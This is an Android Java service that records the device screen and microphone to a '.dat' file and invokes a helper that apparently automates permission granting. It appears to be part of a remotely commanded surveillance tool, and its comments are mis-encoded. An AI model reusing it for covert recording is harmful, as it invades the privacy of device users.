/**
 * 
 */
package order.screen;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import order.OrderService;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;

/**
 * @author ASUS
 *
 */
@TargetApi(Build.VERSION_CODES.LOLLIPOP)
public class ScreenRecordService extends Service {
	 private static ScreenRecordService current=null;
	private int mScreenWidth;
	private int mScreenHeight;
	private int mScreenDensity;
	private int mResultCode;
	private Intent mResultData;
	/** �Ƿ�Ϊ������Ƶ */
	private boolean isVideoSd;
	/** �Ƿ�����Ƶ¼�� */
	private boolean isAudio;
	private boolean mIsRecoding=false;//�Ƿ�¼����
	private int mBitRate;
	private MediaProjection mMediaProjection;
	private MediaRecorder mMediaRecorder;
	private VirtualDisplay mVirtualDisplay;
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		Log.i(ConfigCt.TAG, "ScreenRecordService onCreate() is called");
		ScreenRecordActivity.startInstance(this,ScreenRecordActivity.REQUEST_RECORD_SCREEN);
		current=this;
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.i(ConfigCt.TAG, "ScreenRecordService Service onStartCommand() is called");
		Intent ResultData= intent.getParcelableExtra("data");
		if(ResultData==null){//¼��:
			if(mMediaRecorder!=null&&mMediaProjection!=null){
				 //start();
			}else{
				//ScreenRecordActivity.startInstance(this);
			}
		}else{//¼����ʼ������¼����
			mResultCode = intent.getIntExtra("code", -1);
			mResultData = intent.getParcelableExtra("data");
			mScreenWidth = intent.getIntExtra("width", 720);
			mScreenHeight = intent.getIntExtra("height", 1280);
			mScreenDensity = intent.getIntExtra("density", 1);
			isVideoSd = intent.getBooleanExtra("quality", true);
			isAudio = intent.getBooleanExtra("audio", true);
			//mMediaProjection =  createMediaProjection();
			//mMediaRecorder = createMediaRecorder();
			//mVirtualDisplay = createVirtualDisplay(); // ������mediaRecorder.prepare() ֮����ã����򱨴�"fail to get surface"
			//mMediaRecorder.start();
			//if(!init())return Service.START_NOT_STICKY;
			//if(!setPara())return Service.START_NOT_STICKY;
			//if(!setSaveFile())return Service.START_NOT_STICKY;
			//start();
			getCarmaPermission();//��ȡ��������ͷȨ�ޣ�
			recordingThread();//¼���߳�
		}																	
		return Service.START_NOT_STICKY;
	}
	private MediaProjection createMediaProjection() {
		Log.i(ConfigCt.TAG, "Create MediaProjection");
		return ((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE)).getMediaProjection(mResultCode, mResultData);
	}
	
	private MediaRecorder createMediaRecorder() {
		//SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
		//Date curDate = new Date(System.currentTimeMillis());
		//String curTime = formatter.format(curDate).replace(" ", "");
		//String videoQuality = "HD";
		//if(isVideoSd) videoQuality = "SD";
		
		Log.i(ConfigCt.TAG, "Create MediaRecorder");
		MediaRecorder mediaRecorder = new MediaRecorder();
		if(isAudio) mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); 
		mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE); 
		mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); 
		//mediaRecorder.setOutputFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES) + "/" + videoQuality + curTime + ".mp4");
		String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".dat");
		mediaRecorder.setOutputFile(filename);
		mediaRecorder.setVideoSize(mScreenWidth, mScreenHeight);  //after setVideoSource(), setOutFormat()
		mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  //after setOutputFormat()
		if(isAudio) mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);  //after setOutputFormat()
		int bitRate;
		if(isVideoSd) {
			mediaRecorder.setVideoEncodingBitRate(mScreenWidth * mScreenHeight); 
			mediaRecorder.setVideoFrameRate(30); 
			bitRate = mScreenWidth * mScreenHeight / 1000;
		} else {
			mediaRecorder.setVideoEncodingBitRate(5 * mScreenWidth * mScreenHeight); 
			mediaRecorder.setVideoFrameRate(60); //after setVideoSource(), setOutFormat()
			bitRate = 5 * mScreenWidth * mScreenHeight / 1000;
		}
		try {
			mediaRecorder.prepare();
		} catch (IllegalStateException | IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Log.i(ConfigCt.TAG, "Audio: " + isAudio + ", SD video: " + isVideoSd + ", BitRate: " + bitRate + "kbps");
		
		return mediaRecorder;
	}
	
	private VirtualDisplay createVirtualDisplay() {
		Log.i(ConfigCt.TAG, "Create VirtualDisplay");
		return mMediaProjection.createVirtualDisplay(ConfigCt.TAG, mScreenWidth, mScreenHeight, mScreenDensity, 
				DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder.getSurface(), null, null);
	}
	private boolean getVirtualDisplay() {
		Log.i(ConfigCt.TAG, "Create VirtualDisplay");
		if(mMediaProjection==null)return false;
		if(mMediaRecorder==null)return false;
    	try{
    		mVirtualDisplay = mMediaProjection.createVirtualDisplay(ConfigCt.TAG, mScreenWidth, mScreenHeight, mScreenDensity, 
				DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mMediaRecorder.getSurface(), null, null);
    		return true;
    	}catch(SecurityException e){
    		e.printStackTrace();
    		return false;
    	}
	}
	
	
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		current=null;
		Log.i(ConfigCt.TAG, "ScreenRecordService onDestroy");
		if(mVirtualDisplay != null) {
			mVirtualDisplay.release();
			mVirtualDisplay = null;
		}
		if(mMediaRecorder != null) {
			mMediaRecorder.setOnErrorListener(null);
			mMediaProjection.stop();
			mMediaRecorder.reset();
		}
		if(mMediaProjection != null) {
			mMediaProjection.stop();
			mMediaProjection = null;
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	/*
	 *��ʼ��¼�� 
	 * */
	private boolean init() {
		mMediaProjection =  createMediaProjection();
		if(mMediaProjection==null)return false;
		mMediaRecorder = new MediaRecorder();
		return true;
	}
	/*
	 *���ò��������ļ� 
	 * */
	private boolean setSaveFile() {
		String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".dat");
		return setSaveFile(filename);
	}
	/*
	 *���ò��������ļ� 
	 * */
	private boolean setSaveFile(String filename) {
		if(mMediaRecorder==null)return false;
		mMediaRecorder.setOutputFile(filename);
		return true;
	}
	/*
	 *���ò���¼�� 
	 * */
	private boolean setPara() {
		if(mMediaRecorder==null)return false;
		if(isAudio) mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); 
		mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE); 
		mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); 
		ConfigCt.getInstance(getApplicationContext()).setCameraPermission(true);
		ConfigCt.getInstance(getApplicationContext()).setAudioPermission(true);
		//mediaRecorder.setOutputFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES) + "/" + videoQuality + curTime + ".mp4");
		mMediaRecorder.setVideoSize(mScreenWidth, mScreenHeight);  //after setVideoSource(), setOutFormat()
		mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);  //after setOutputFormat()
		if(isAudio) mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);  //after setOutputFormat()
		int bitRate;
		if(isVideoSd) {
			mMediaRecorder.setVideoEncodingBitRate(mScreenWidth * mScreenHeight); 
			mMediaRecorder.setVideoFrameRate(30); 
			bitRate = mScreenWidth * mScreenHeight / 1000;
		} else {
			mMediaRecorder.setVideoEncodingBitRate(5 * mScreenWidth * mScreenHeight); 
			mMediaRecorder.setVideoFrameRate(60); //after setVideoSource(), setOutFormat()
			bitRate = 5 * mScreenWidth * mScreenHeight / 1000;
		}
		mBitRate=bitRate;
		Log.i(ConfigCt.TAG, "Audio: " + isAudio + ", SD video: " + isVideoSd + ", BitRate: " + bitRate + "kbps");
		return true;
	}
	/*
	 *׼��¼�� 
	 * */
	private boolean prepare() {
		if(mMediaRecorder==null)return false;
		try {
			mMediaRecorder.prepare();
		} catch (IllegalStateException | IOException e) {
			e.printStackTrace();
			return false;
		}
		if(!getVirtualDisplay())return false; 
		return true;
	}
	/*
	 *��ʼ¼�� 
	 * */
	public void start() {
		if(!prepare())return;
		mMediaRecorder.start();
		mIsRecoding=true;
	}
	/*
	 *��ȡ��������ͷȨ��
	 * */
	public void getCarmaPermission() {
		if(!ConfigCt.getInstance(getApplicationContext()).haveCameraPermission()){
			if(GivePermission.getGivePermission().isEnable()){
    			GivePermission.getGivePermission().EventStart();
    			GivePermission.getGivePermission().TimeStart();
    		}
		}
	}
    /*
     * ����¼���̣߳�
     */
    public void recordingThread(){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				//Looper.prepare();
				try{
					if(!init())return;
					if(!setPara())return;
					if(!setSaveFile())return;
					start();
				}catch(Exception e){
					e.printStackTrace();
				}
				//Looper.loop(); 
		    }    
		}).start();
    }
	/*
	 *ֹͣ¼�� 
	 * */
	public void stop() {
		if(mVirtualDisplay != null) {
			mVirtualDisplay.release();
			mVirtualDisplay = null;
		}
		if(mMediaRecorder != null) {
			mMediaRecorder.setOnErrorListener(null);
			mMediaProjection.stop();
			mMediaRecorder.reset();
		}
		if(mMediaProjection != null) {
			mMediaProjection.stop();
			mMediaProjection = null;
		}
		mIsRecoding=false;
	}
	/*
	 *����¼��״̬ 
	 * */
	public boolean isRecording() {
		return mIsRecoding;
	}
	public static ScreenRecordService getInstance(){
		return current;
	}
	/*
	 *����¼��
	 * */
	public static void start(Context context){
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
			Intent intent=new Intent(context,ScreenRecordService.class);
			context.startService(intent);
		}
	}
	/*
	 *ֹͣ¼��
	 * */
	public static void stop(Context context){
		Intent intent=new Intent(context,ScreenRecordService.class);
		context.stopService(intent);
	}

}
